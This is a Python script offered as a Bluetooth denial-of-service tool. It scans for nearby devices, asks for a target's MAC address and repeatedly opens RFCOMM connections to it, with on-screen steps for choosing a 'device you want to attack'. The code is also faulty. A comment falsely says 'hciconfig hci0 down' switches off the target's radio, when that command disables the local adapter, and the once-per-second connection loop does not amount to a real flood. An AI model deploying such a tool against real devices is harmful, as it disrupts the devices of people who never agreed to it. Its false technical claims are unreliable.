import bluetooth
import subprocess
import time

# Help Center
print("Welcome to the Help Center\n")
print("To use this tool, follow these steps:")
print("1. Scan for nearby Bluetooth devices")
print("2. Note down the name and MAC address of the device you want to attack")
print("3. Enter the MAC address of the target device when prompted")
print("4. Wait for the tool to perform the DoS attack\n")

# Scan for nearby Bluetooth devices
devices = bluetooth.discover_devices()

# Print the list of discovered devices
print("Bluetooth Devices:\n")
print("{:<20} {:<17}".format("Device Name", "MAC Address"))
print("----------------------------------------")
for addr in devices:
    name = bluetooth.lookup_name(addr)
    if name is not None and addr is not None:
        print("{:<20} {:<17}".format(name, addr))

# Get the MAC address of the target device from the user
target_mac = input("\nEnter the MAC address of the target device: ")

# Turn off the Bluetooth radio on the target device using hciconfig
subprocess.call(['hciconfig', 'hci0', 'down'])

# Continuously attempt to connect to the target device
while True:
    try:
        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        sock.connect((target_mac, 1))
        sock.close()
        print("DoS attack sent to target device...")
        time.sleep(1) # add delay to control the speed of attack
    except KeyboardInterrupt:
        print("\nDoS attack stopped by user...")
        break
    except:
        print("Failed to connect to target device...")
        pass
